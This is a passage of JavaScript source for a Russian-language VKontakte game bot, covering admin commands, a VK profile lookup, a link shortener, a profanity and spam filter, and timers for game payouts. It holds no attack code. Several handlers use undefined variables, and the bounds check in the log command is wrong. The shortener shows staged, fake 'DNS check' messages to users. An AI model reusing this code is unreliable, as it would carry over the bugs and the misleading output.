			🔹 ➾ Баланс: ${id.balance}
			🔹 ➾ Биткоинов: ${id.bitcoin}
			🚫 ➾ Жалоб: ${id.almin23}
			🔹 ➾ Рубинов: ${id.donate}
			🔹 ➾ Привилегия: ${id.ap.toString().replace(/0/gi, "Игрок").replace(/1/gi, "Стажёр").replace(/2/gi, "Администратор").replace(/3/gi, "Главный Администратор")}
			🔹 ➾ Дата регистрации: ${id.rtime}

			Имущество:\n` +
			(user.ap >= 3 ? `✈ ➾ Самолет:  ${id.aircraft.name}\n` : ``)+
			(user.ap >= 3 ? `🚁 ➾ Вертолет: ${id.helicopter.name}\n` : ``)+
			(user.ap >= 3 ? `🚘 ➾ Автомобиль: ${id.cars.name}\n` : ``)+  
			(user.ap >= 3 ? `🚤 ➾ Лодка: ${id.lodka}\n` : ``)+ 
			(user.ap >= 3 ? `🏡 ➾ Дом: ${id.house}\n` : ``)+   
			(user.pit== false ? `🐼 ➾ Питомец:  отсутствует\n` : `🐼 ➾ Питомец:  ${user.pit}\n`)+
			(user.gun_name == false ? `🔫 ➾ Отсутствует\n` : `🔫 ➾ Название: ${user.gun_name}\n`)+  
			` 
			`+
			(user.ap >= 3 ? `🔸 ➾ Последнее смс боту: ${id.msg.last_msg}\n` : ``)+  
			(user.ap >= 3 ? `🔸 ➾ Сообщений боту: ${id.msg.messages}\n` : ``)+ 
			(user.ap >= 3 ? `🔸 ➾ Уровень: ${id.upis65465465}\n` : ``)+  

			(user.ap >= 3 ? `\n⚠ ➾ Предупреждений: ${id.warn}\n` : ``)+ 
			(user.ap >= 3 ? `⚠ ➾ Причины: [${id.warn}]\n${warns}\n` : ``)+ 
			(user.ap >= 3 ? `⛔ ➾ Админ-выговоров: ${user.ainfo.vig}\n` : ``)+  
			(id.ban == false ? `⚠ ➾ Аккаунт не заблокирован\n` : `⚠ ➾ Аккаунт заблокирован [${id.ban}]`)
			);
	});



	vk.updates.hear(/^(?:log)\s?([0-9]+)?\s?([0-9]+)?/i, (message) => {
		let user = acc.users[user_id(message.user)];
		if(user.ap < 3) return;

		if(!message.$match[2]) return message.send(`- - log [id] [number] - -\n1. Передачи [передать]\n2. Выдачи [give]\n3. Обнуления [remove]\n4. Выдача прав [admin]\n5. Обнуление прав [admin]\n6. Варны [warn]`) 
			let id = message.$match[1];
		let i = message.$match[2];
		if(i < 0 || i > 5) return message.send(`Error`);
		let text = '';
		if(i == 1) for(i=0; i!=log.point[id].log.length; i++){text += log.point[id].log[i];}
		if(i == 2) for(i=0; i!=log.give[id].log.length; i++){text += log.give[id].log[i];}
		if(i == 3) for(i=0; i!=log.remove[id].log.length; i++){text += log.remove[id].log[i];} 
		if(i == 4) for(i=0; i!=log.admin[id].log.length; i++){text += log.admin[id].log[i];} 
		if(i == 5) for(i=0; i!=log.setwin[id].log.length; i++){text += log.setwin[id].log[i];}  
		if(i == 6) for(i=0; i!=log.warns[id].log.length; i++){text += log.warns[id].log[i];}  
		return message.send(text);
	});





	vk.updates.hear(/^(?:Ацентр)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.ap < 3) return message.send(`Вы не модератор !`);
		let rez = [false].random();
		if(rez == false){
			let text = [].random(); 
			return message.send(`✅🔊 Привет уважаемый администратор ! Ты в админ центре !\nЧтобы отправить смс, напиши " адмсмс [текст] "`, { attachment: "" 
		}); 
		}else{ 
			let count = [10].random();
			user.upi564456465s = count;
			return message.send(`⛳ Вы в парке.\nЗдесь Вы сможете пообщаться с игроками на различные игровые темы.\nВы подключены в чат, чтобы написать сообщение, напишите " чп [текст] "\nПример: чп привет !\nЧтобы выйти с парка, просто напишите " выходпарк " и тогда вы будете отключены от чата.`);
		}
	});





	vk.updates.hear(/^(?:clear)$/i, async (message, bot) => {
		if(user.ap < 3) return;
		return message.send("&#4448;\n".repeat(200) + "Я очистила чат от лишних сообщений!");
	});




	vk.updates.hear(/^(?:сократи)\s?([^]+)?/i, message => { 
		let user = acc.users[user_id(message.user)];
		let cc = message.$match[1].toLowerCase(); 
		let text = message.$match[1]; 
		let stick = [8480,11997,12116,11565,11607,6111,6119,10327,10335,10336,11098,11097,11094,4277,4278,4284,4296,8484,4318,11240,11249,11242,11120,11121,10354,10359,10360,7322,7327,7331,7330,7328,303,308,301,7470,10874,10407,8471,10413,8472,5823].random();
		if(!text) return message.send(`Произошла ошибка.\n -- Введите: "Сократи [Сcылка]`); 
		vk.api.call("utils.getShortLink", {url: text}).then(function (res){ 
			if(!text) return message.send(`${rnick}, Произошла ошибка.\n -- Введите: "Сократи [Сcылка]`); 
			message.send(`${rnick}, Проверяем доступность ссылки..`); 
			setTimeout(() => {message.send(`Генерируем ссылку...`); }, 4000); 
			setTimeout(() => {message.send(`Проверка DNS соеденения..`); }, 6000); 
			setTimeout(() => {message.send(`Готовим к отправке..`); }, 8000); 
			setTimeout(() => {message.send(`Ваша ссылка готова: ` + res.short_url); }, 10000); 
			setTimeout(() => {message.send({sticker_id: stick}); }, 11000); 
		}); 
	});

	vk.updates.hear(/^(?:bonus)\s([^]+)\s([0-9]+)/i, (message) => { 

		let id = user_id(message.user);		
		let i = config;
		if(message.user != 515126478) return;
		let user = acc.users[user_id(message.user)]; 
		if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`); 

		if(message.$match[1] == 'balance'){
			if(message.$match[2] == 1){ config.bonus_balance = true; return message.send(`✅ ➾ Вы включили х2 баланс для игр.`); } 
			if(message.$match[2] == 0){ config.bonus_balance = false; return message.send(`✅ ➾ Вы выключили х2 баланс в играх.`); }
		}  
		if(message.$match[1] == 'exs'){ 
			if(message.$match[2] == 1){ config.bonus_exs = true; return message.send(`✅ ➾ Вы включили х2 опыт в играх.`); } 
			if(message.$match[2] == 0){ config.bonus_exs = false; return message.send(`✅ ➾ Вы выключили х2 опыт в играх`); }
		}   
	}); 

	vk.updates.hear(/^(?:promo)\s([^]+)\s([0-9]+)/i, (message) => {
		let id = user_id(message.user);		
		let i = config;
		if(message.user != 515126478) return; 
		let user = acc.users[user_id(message.user)]; 
		if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`); 

		if(message.$match[1] == 'balance'){
			config.promo.balance = Number(message.$match[2]); return message.send(`✅ ➾ Сумма для промокодов состовляет: ${message.$match[2]}$`);
		}  
		if(message.$match[1] == 'activ'){ 
			config.promo.activ = Number(message.$match[2]); return message.send(`✅ ➾ Количество активаций для промокодов состовляет: ${message.$match[2]}`);
		}   
	}); 











	vk.updates.hear(/^(?:впрофиль)(\s?https\:\/\/vk\.com\/)?(id)?([0-9]+)?([^]+)?/i, (message) => { 
		let userss = acc.users[user_id(message.user)]; 
		if(user.upis65465465 < 10) return message.send(`❗ Доступно с 10 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
		let id1 = message.$match[3]; 
		if(user.ap < 3) return; 

		if(message.$match[4]) { 

			var domain = message.$match[4].split(" "); 

			vk.api.call("utils.resolveScreenName", {screen_name: message.$match[4]}).then((res) => { 
				vk.api.users.get({user_id: res.object_id, fields: "city,freinds,verified,status,photo_id,sex,followers_count,photo_id,online,city,country,bdate,getMutual_count"}) 

				.then((res) => { 

					let user = res[0]; 
					return message.send(` 

						✓ Информация пользователя: @id${user.id} (${user.first_name} ${user.last_name}) ✓  
						ID Профиля ВКонтакте: @id${user.id} (${user.id}) 
						Подписчики: `+(user.followers_count == undefined ? `Отсутствуют.` : `${spaces(user.followers_count)} шт.`)+` 
						Страна, город: `+(user.country == undefined ? `Не указан, ` : `${user.country.title}, `)+ (user.city == undefined ? `Не указан.` : `${user.city.title}.`)+` 
						Пол: ${user.sex.toString().replace(/undefined/gi, "Не указан.").replace(/0/gi, "Не указан.").replace(/1/gi, "Женский.").replace(/2/gi, "Мужской.")} 
						Дата рождения: `+(user.bdate == undefined ? `Не указана.` : `${user.bdate}.`)+` 
						Статус профиля: `+(user.status == undefined ? `Не Установлен.` : `${user.status}.`)+` 
						Состояние: ${user.online.toString().replace(/undefined/gi, "Не в сети.").replace(/0/gi, "Не в сети.").replace(/1/gi, "В сети.")} 
						Верефикация: ${user.verified.toString().replace(/undefined/gi, "Не Верефицирован.").replace(/0/gi, "Не Верефицирован.").replace(/1/gi, "Страница подтверждена Администрацией ВКонтакте.")} 

						Ава профиля:`, 
						{attachment: `photo${user.photo_id}`}); 
				}) 
			}) 
		}else{ 
			vk.api.call('users.get', {user_id: message.$match[3], fields: "city,freinds,verified,status,photo_id,sex,followers_count,photo_id,online,city,country,bdate,getMutual_count"}).then((res) => { 
				return message.send(` 

					✓ Информация пользователя: @id${user.id} (${user.first_name} ${user.last_name}) ✓ 
					ID Профиля ВКонтакте: @id${id1} 
					Подписчики: `+(user.followers_count == undefined ? `Отсутствуют.` : `${spaces(user.followers_count)} шт.`)+` 
					Страна, город: `+(user.country == undefined ? `Не указан, ` : `${user.country.title}, `)+ (user.city == undefined ? `Не указан.` : `${user.city.title}.`)+` 
					Пол: ${user.sex.toString().replace(/undefined/gi, "Не указан.").replace(/0/gi, "Не указан.").replace(/1/gi, "Женский.").replace(/2/gi, "Мужской.")} 
					Дата рождения: `+(user.bdate == undefined ? `Не указана.` : `${user.bdate}.`)+` 
					Статус профиля: `+(user.status == undefined ? `Не Установлен.` : `${user.status}.`)+` 
					Состояние: ${user.online.toString().replace(/undefined/gi, "Не в сети.").replace(/0/gi, "Не в сети.").replace(/1/gi, "В сети.")} 
					Верефикация: ${user.verified.toString().replace(/undefined/gi, "Не Верефицирован.").replace(/0/gi, "Не Верефицирован.").replace(/1/gi, "Страница подтверждена Администрацией ВКонтакте.")} 

					Ава профиля:`, 
					{attachment: `photo${user.photo_id}`}); 
			}) 
		} 
	});
///






vk.updates.hear(/^(?:giveferma)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: giveferma ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не спец администратор !`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	acc.users[message.$match[1]].volftube3 = true; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Спец админ ${user.prefix} выдал вам элитную майнинг ферму ! Посмотреть команды " эферма "`, random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Успешно >>>> ВЫДАНО >>>> [${acc.users[message.$match[1]].prefix}]`);
});	
vk.updates.hear(/^(?:dellferma)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: dellferma ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не спец администратор !`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	acc.users[message.$match[1]].volftube3 = false; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Спец админ ${user.prefix} забрал у вас элитную майнинг ферму !`, random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Успешно >>>> УДАЛЕНО >>>> [${acc.users[message.$match[1]].prefix}]`);
});




























let cases = [
{
	uron: 36,
	name: 'Пистолет "Deagle"'
},
{
	uron: 36,
	name: 'Автомат "M4A4"'
}, 
{
	uron: 55,
	name: `Дробовик "Sawed-Off"`
},
{
	uron: 43,
	name: `Пистолет "Five-SeveN | Испытание огнём"`
},
{
	uron: 37,
	name: `Автомат "AK-47"`
},
{
	uron: 35,
	name: `Автомат "AUG"`
},
{
	uron: 34,
	name: `Автомат "Galil AR"`
},
{
	uron: 37,
	name: `Пистолет-Пулемет "ПП-19 Бизон"`
},
{
	uron: 44,
	name: `Пистолет-Пулемет "MP9"`
},
{
	uron: 45,
	name: `Пистолет-Пулемет "UMP-45"`
}, 
{
	uron: 55,
	name: `Пистолеты "Dual Berettas | Удар кобры"`
},
{
	uron: 49,
	name: `Дробовик "Nova | Экзо"`
},
{
	uron: 43,
	name: `Пистолет "Desert Eagle | Директива"`
},
{
	uron: 45,
	name: `Револьвер "R8 | Кровавая паутина"`
} 

]

async function run() {
	await vk.updates.startPolling();
	console.log('Бот успешно запущен.');
	restart();
}

run().catch(console.error);



function rand(min, max) {return Math.round(Math.random() * (max - min)) + min} 
var parserInt = (str) => parseInt(str.replace(/k|к/ig, "000"));
function spaces(string) {
	if (typeof string !== "string") string = string.toString();
	return string.split("").reverse().join("").match(/[0-9]{1,3}/g).join(".").split("").reverse().join("");
};
Array.prototype.random = function() {  
	return this[Math.floor(this.length * Math.random())];
}

 //------------------------------------------------------------------------------------\\ 
 //------------------------------------------------------------------------------------\\
 function user_id(id) {
 	let ids = 0
 	if(uid[id]){
 		ids = uid[id].id
 	}    
 	return ids; 
 }  
  //------------------------------------------------------------------------------------\\
//------------------------------------------------------------------------------------\\
	// log
	function logs(id, ids, num, type) {

 	// - - - - - - - - - - - - - - - - -  
 	if(type == 1){ 
 		if(!log.point[ids]){ log.point[ids] = { log: [] }  } 
 			if(!log.point[id]){ log.point[id] = { log: [] }  } 
 				log.point[id].log.push(`[${time()} | ${data()} | Pay] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}$\n`)
 			log.point[ids].log.push(`[${time()} | ${data()} | Pay] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}$\n`)
 			if(log.point[id].log.length >= 15){ delete log.point[id].log.shift() } 
 				if(log.point[ids].log.length >= 15){ delete log.point[id].log.shift() } 
 			}
 		if(type == 2){ 
 			if(!log.give[ids]){ log.give[ids] = { log: [] }  } 
 				if(!log.give[id]){ log.give[id] = { log: [] }  } 
 					log.give[id].log.push(`[${time()} | ${data()} | Give] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}$\n`)
 				log.give[ids].log.push(`[${time()} | ${data()} | Give] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}$\n`)
 				if(log.give[id].log.length >= 15){ delete log.give[id].log.shift() } 
 					if(log.give[ids].log.length >= 15){ delete log.give[id].log.shift() }  
 				}
 			if(type == 3){ 
 				if(!log.remove[ids]){ log.remove[ids] = { log: [] }  } 
 					if(!log.remove[id]){ log.remove[id] = { log: [] }  } 
 						log.remove[id].log.push(`[${time()} | ${data()} | Remove] Забрал [ID: ${id}] у игрока [ID: ${ids}] \n`)
 					log.remove[ids].log.push(`[${time()} | ${data()} | Remove] Забрал [ID: ${id}] у игрока [ID: ${ids}] \n`)
 					if(log.remove[id].log.length >= 15){ delete log.remove[id].log.shift() } 
 						if(log.remove[ids].log.length >= 15){ delete log.remove[id].log.shift() } 
 					} 
 				if(type == 4){ 
 					if(!log.admin[ids]){ log.admin[ids] = { log: [] }  } 
 						if(!log.admin[id]){ log.admin[id] = { log: [] }  } 
 							log.admin[id].log.push(`[${time()} | ${data()} | Admin] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num} lvl\n`)
 						log.admin[ids].log.push(`[${time()} | ${data()} | Admin] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num} lvl\n`)
 						if(log.admin[id].log.length >= 15){ delete log.admin[id].log.shift() } 
 							if(log.admin[ids].log.length >= 15){ delete log.admin[id].log.shift() } 
 						} 
 					if(type == 5){ 
 						if(!log.setwin[ids]){ log.setwin[ids] = { log: [] }  } 
 							if(!log.setwin[id]){ log.setwin[id] = { log: [] }  } 
 								log.setwin[id].log.push(`[${time()} | ${data()} | Setwin] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}%\n`)
 							log.setwin[ids].log.push(`[${time()} | ${data()} | Setwin] Выдал [ID: ${id}] игроку [ID: ${ids}] -> ${num}%\n`)
 							if(log.setwin[id].log.length >= 15){ delete log.setwin[id].log.shift() } 
 								if(log.setwin[ids].log.length >= 15){ delete log.setwin[id].log.shift() }  
 							} 
 						if(type == 6){ 
 							if(!log.warns[ids]){ log.warns[ids] = { log: [] }  } 
 								if(!log.warns[id]){ log.warns[id] = { log: [] }  } 
 									log.warns[id].log.push(`[${time()} | ${data()} | warn] Выдал [ID: ${id}] игроку [ID: ${ids}] | Причина: ${num}\n`)
 								log.warns[ids].log.push(`[${time()} | ${data()} | warn] Выдал [ID: ${id}] игроку [ID: ${ids}] | Причина: ${num}\n`)
 								if(log.warns[id].log.length >= 15){ delete log.warns[id].log.shift() } 
 									if(log.warns[ids].log.length >= 15){ delete log.warns[id].log.shift() }  
 								} 
 						}
	//

	// log

	function game_log(id, name, count, win_lose) {

 	// - - - - - - - - - - - - - - - - -   
 	if(!log.game[id]){ log.game[id] = { log: [] }  } 
 		log.game[id].log.push(`[${time()} | ${data()} | ${name}] Ставка: ${count}$ | Исход: ${win_lose.toString().replace(/0/gi, "❌").replace(/1/gi, "✅")}\n`) 
 	if(log.game[id].log.length >= 15){ delete log.game[id].log.shift() }  

 }
	//
 //------------------------------------------------------------------------------------\\
 function lvlup(id) {
 	let text = false;
 	if(acc.users[id].exs >= acc.users[id].exsup){
 		acc.users[id].exs -= acc.users[id].exsup;
 		acc.users[id].lvl += 1;
 		if(acc.users[id].game.win < 52){acc.users[id].game.win += 1;}
 		acc.users[id].exsup += new_lvl();
 		text = true;
 	}
 	return text;
 } 
 //------------------------------------------------------------------------------------\\
 function new_lvl(iid) {
 	let ids = 0
 	let numbers = [10,20,30,40,50,60];
 	let rand = numbers.random()
 	return rand;
 }
 //------------------------------------------------------------------------------------\\
 function zapret(text) {
 	let text1 = text.toLowerCase();
 	let texts = 0;
 	let stat = false;
 	var zaprets = /(вк бо т |сова не спит|гей|пидорас|шлюха|даун|давен|петух|мать ебал|ебал|сын шлюхи|сын пидора|пидорасина|гандон|гондон|тварь|лох|@|@club|@@|vk|vk.me|сова никогда не спит|@club|@|с о в а н е с п и т|сованикогданеспит|сова не спит никогда|вкботру|vkvot ru|vkbotru|vkbot|v k b o t . r u|в к бот|порно|botvk|ботвк|vkbot|кбот|bot vk|хентай|секс|пидр|трах|насилие|зоофил|бдсм|сирия|hentai|hentay|синий кит|самоубийство|террористы|слив|цп|cp|маленькие|малолетки|сучки|трах|ебля|изнасилование|блять|хуй|пошел нах|тварь|мразь|сучка|гандон|уебок|шлюх|паскуда|оргазм|девственницы|целки|рассовое|мелкие|малолетки|несовершеннолетние|ебля|хентай|sex|bdsm|ebl|trax|syka|shlux|инцест|iznas|мать|долбаеб|долбаёб|хуесос|сучка|сука|тварь|пездюк|хуй|шлюх|бог|сатана|мразь)/
 	if (zaprets.test(text1) == true) { 
 		texts = `📗 ➾ Ошибка в тексте. Бан захотели ?!` 
 		stat = true;
 	}
 	var filter1 = /(http(s)?:\/\/.)?(www\.)?[-a-z0-9@:%._\+~#=]{1,256}\.[a-z]{2,6}/
 	var filter2 = /(?!http(s)?:\/\/)?(www\.)?[а-я0-9-_.]{1,256}\.(рф|срб|блог|бг|укр|рус|қаз|امارات.|مصر.|السعودية.)/ 
 	if (filter1.test(text1) == true || filter2.test(text1) == true) { 
 		texts = `📗 ➾ Некорректный запрос.` 
 		stat = true; 
 	}
 	return texts
 } 
  //------------------------------------------------------------------------------------\\
  var uptime = { sec: 0, min: 0, hours: 0, days: 0 }
 //------------------------------------------------------------------------------------\\
 setInterval(() => {
 	uptime.sec++;
 	if (uptime.sec == 60) { uptime.sec = 0; uptime.min += 1; }
 	if (uptime.min == 60) { uptime.min = 0; uptime.hours += 1; }
 	if (uptime.hours == 24) { uptime.hours = 0; uptime.days += 1; }
 }, 1000);

 
 
 function time() {
 	let date = new Date();
 	let days = date.getDate();
 	let hours = date.getHours();
 	let minutes = date.getMinutes();
 	let seconds = date.getSeconds();
 	if (hours < 10) hours = "0" + hours;
 	if (minutes < 10) minutes = "0" + minutes;
 	if (seconds < 10) seconds = "0" + seconds;
 	var times = hours + ':' + minutes + ':' + seconds
 	return times;
 }
 //------------------------------------------------------------------------------------\\
 function data() {
 	var date = new Date();
 	let days = date.getDate();
 	let month = date.getMonth() + 1; 
 	if (month < 10) month = "0" + month;
 	if (days < 10) days = "0" + days;
 	var datas = days + ':' + month + ':2019' ;
 	return datas;
 }
 //------------------------------------------------------------------------------------\\ 
 setInterval(() => {
 	acc.curs = rand(30000,80000)	
 	acc.bit = rand(31000,32200)
 }, 600000);


 setInterval(() =>{
 	for(i=1;i<200000;i++){
 		if(acc.users[i]){
 			if(acc.users[i].autobiz != false){
 				acc.users[i].autobiz -= 1;
 				if(acc.users[i].autobiz == 0){acc.users[i].autobiz = false}

 					if(acc.users[i].bizs.one_biz == true){
 						acc.users[i].balance += Number(acc.users[i].bizs.one.zp)
 					}
 					if(acc.users[i].bizs.two_biz == true){
 						acc.users[i].balance += Number(acc.users[i].bizs.two.zp)
 					}
 				}
	 			//
	 			if(acc.users[i].autozp != false){
	 				if(acc.users[i].job.name != false){
	 					acc.users[i].autozp -= 1;
	 					if(acc.users[i].autozp == 0){acc.users[i].autozp = false}
	 						acc.users[i].balance += Number(acc.users[i].job.count)	
	 				}
	 			}
	 		}

	 	}
	 }, 3600000); 
 
 
 function restart() {
 	for(i=1;i < 200000; i++){  
 		if(acc.users[i]){
 			acc.users[i].bloks.cases = false;
 			acc.users[i].bloks.bonus = false;
 			acc.users[i].bloks.random_game = false;
 			acc.users[i].bloks.gun_case = false;
 			acc.users[i].bloks.pay = false;
 			acc.users[i].bloks.nik = false;
 			acc.users[i].bloks.piska = false;
 			acc.users[i].bloks.rukus = false;
 			acc.users[i].bloks.a_case = false;
 			acc.users[i].bloks.giverub = false;
 			acc.users[i].job.stop = false;
 			acc.users[i].bizs.one.stop = false;
 			acc.users[i].bizs.two.stop = false;
 			acc.users[i].safe.status = false;
 			acc.users[i].safe.key = false;
 			acc.users[i].bloks.sss = false;
 			acc.users[i].bloks.ment = false;
 			acc.users[i].bloks.pari = false;
 			acc.users[i].bloks.marmok = false; 
 			acc.users[i].bloks.lsas  = false; 
 			acc.users[i].bloks.yunet = false;
 			acc.users[i].bloks.baza = false;
 			acc.users[i].bloks.vivi = false;
 			acc.users[i].bloks.sssss1 = false;
 			acc.users[i].bloks.sssss143 = false;
 			acc.users[i].bloks.sssss12 = false;
 			acc.users[i].bloks.sssss8  = false;
 			acc.users[i].bloks.sssss1111 = false;
 			acc.users[i].bloks.sssss13 = false;
 			acc.users[i].bloks.sssss14 = false;
 			acc.users[i].bloks.muma = false;
 			acc.users[i].bloks.gandon = false; 
 			acc.users[i].almin1 = false;  
 			acc.users[i].reys = false;
 			acc.users[i].bloks.sssss4 = false; 
 			acc.users[i].bloks.dlis = false; 

 		}
 	} 
 }

 
 function getRandomElement(array) { 
 	return array[getRandomInt(array.length - 1)]; 
 }

 function getRandomInt(x, y) { 
 	return y ? Math.round(Math.random() * (y - x)) + x : Math.round(Math.random() * x); 
 }

 function spaces(string) {
 	if (typeof string !== "string") string = string.toString();
 	return string.split("").reverse().join("").match(/[0-9]{1,3}/g).join(".").split("").reverse().join("");
 };
 Array.prototype.random = function() {  
 	return this[Math.floor(this.length * Math.random())];
 }

 var parserInt = (str) => parseInt(str.replace(/k|к/ig, "000"));





 Array.prototype.random = function() {  
 	return this[Math.floor(this.length * Math.random())];
 }

 function rand(min, max) {
 	return Math.round(Math.random() * (max - min)) + min
 }
/////////////////////////////////////////////КОНЕЦ КОДА///////////////////////////////////////////////////////////////////////////////////



function button(array) { 
	let kb = []; 
	if (array.length > 40) return false; 

	for (let i = 0; i < 10; i += 1) { 
		if (!array.slice(i * 3, i * 3 + 3)[0]) break; 
		kb.push(array.slice(i * 3, i * 3 + 3)); 
	} 

	kb.map((arr) => { 
		arr.map((button, i) => { 
			arr[i] = Keyboard.textButton({ 
				label: button 
			}); 
		}); 
	}); 

	return Keyboard.keyboard(kb); 
}


function getUnix() {
	return Date.now();
}

function unixStamp(stamp) {
	let date = new Date(stamp),
	year = date.getFullYear(),
	month = date.getMonth() + 1,
	day = date.getDate(),
	hour = date.getHours() < 10 ? "0"+date.getHours() : date.getHours(),
	mins = date.getMinutes() < 10 ? "0"+date.getMinutes() : date.getMinutes(),
	secs = date.getSeconds() < 10 ? "0"+date.getSeconds() : date.getSeconds();

	return `${day}.${month}.${year}, ${hour}:${mins}:${secs}`;
}


function unixStampLeft(stamp) {
	stamp = stamp / 1000;
	let s = stamp % 60;
	stamp = ( stamp - s ) / 60;
	let m = stamp % 60;
	stamp = ( stamp - m ) / 60;
	let h = ( stamp ) % 24;
	let d = ( stamp - h ) / 24;
	let text = ``;
	if(d > 0) text += Math.floor(d) + " дн ";
	if(h > 0) text += Math.floor(h) + " ч. ";
	if(m > 0) text += Math.floor(m) + " мин. ";
	if(s > 0) text += Math.floor(s) + " сек.";
	return text;
}



function adm_log(is) {
	let id = is[0];	 
	vk.api.call('messages.send', { 
		chat_id: 788, 
		message: `
		Поступил новый Лог Административных Действий.
		-- Ник Администратора: @id${acc.users[is[0]].id} (${acc.users[id].prefix})
		-- Им была Использована команда: ${is[1]}
		ID Профиля Администратора: ${is[0]}
		Уровень доступа: (${acc.users[id].toString().replace(/0/gi, "Игрок").replace(/1/gi, "Стажёр").replace(/2/gi, "Администратор").replace(/3/gi, "Главный Администратор")}`,
		random_id: 0
	});
};


const utils = {
	sp: (int) => {
		int = int.toString();
		return int.split('').reverse().join('').match(/[0-9]{1,3}/g).join('.').split('').reverse().join('');
	},
	rn: (int, fixed) => {
		if (int === null) return null;
		if (int === 0) return '0';
		fixed = (!fixed || fixed < 0) ? 0 : fixed;
		let b = (int).toPrecision(2).split('e'),
		k = b.length === 1 ? 0 : Math.floor(Math.min(b[1].slice(1), 14) / 3),
		c = k < 1 ? int.toFixed(0 + fixed) : (int / Math.pow(10, k * 3) ).toFixed(1 + fixed),
		d = c < 0 ? c : Math.abs(c),
		e = d + ['', ' тыс', ' млн', ' млрд', ' трлн'][k];

		e = e.replace(/e/g, '');
		e = e.replace(/\+/g, '');
		e = e.replace(/Infinity/g, ' Бесконечность');
		e = e.replace(/undefined/g, ' Бесконечность');
		e = e.replace(/NaN/g, ' Бесконечность');
		e = e.replace(/Nan/g, ' Бесконечность');
		e = e.replace(/Null/g, ' Бесконечность');
		e = e.replace(/null/g, ' Бесконечность');

		return e;
	},
	gi: (int) => {
		int = int.toString();

		let text = ``;
		for (let i = 0; i < int.length; i++)
		{
			text += `${int[i]}&#8419;`;
		}

		return text;
	},
	decl: (n, titles) => { return titles[(n % 10 === 1 && n % 100 !== 11) ? 0 : n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20) ? 1 : 2] },
	random: (x, y) => {
		return y ? Math.round(Math.random() * (y - x)) + x : Math.round(Math.random() * x);
	},
	pick: (array) => {
		return array[utils.random(array.length - 1)];
	}
}